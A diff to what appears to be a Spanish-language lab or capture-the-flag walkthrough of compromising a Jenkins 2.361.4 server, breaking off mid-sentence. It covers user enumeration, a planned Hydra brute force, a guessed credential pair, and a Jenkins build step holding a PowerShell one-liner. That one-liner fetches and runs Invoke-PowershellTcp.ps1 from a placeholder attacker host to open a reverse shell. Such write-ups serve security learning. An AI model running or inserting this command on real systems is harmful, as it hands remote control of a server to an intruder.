@@ -85,4 +85,11 @@ Vemos que es la versión *Jenkins 2.361.4*
 En el panel de *People* podemos enumerar tres cuentas de usuario
 Ahora podremos hacer ataques de fuerza bruta hacia las cuentas usando *Hydra*
 
-Antes de la furza bruta se prueba a usar un usuario y su mismo nombre como contraseña en este caso *builduser:builuser*
+Antes de la fuerza bruta se prueba a usar un usuario y su mismo nombre como contraseña en este caso *builduser:builuser*
+
+Con este usuario se nos permite modificar un proyecto existente, en la modificación de este vamos a *Configure* -> *Add build step* y añadiremos una reverse shell a nuestra maquina
+```shell
+powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
+```
+
+Una vez introducida la revrse she
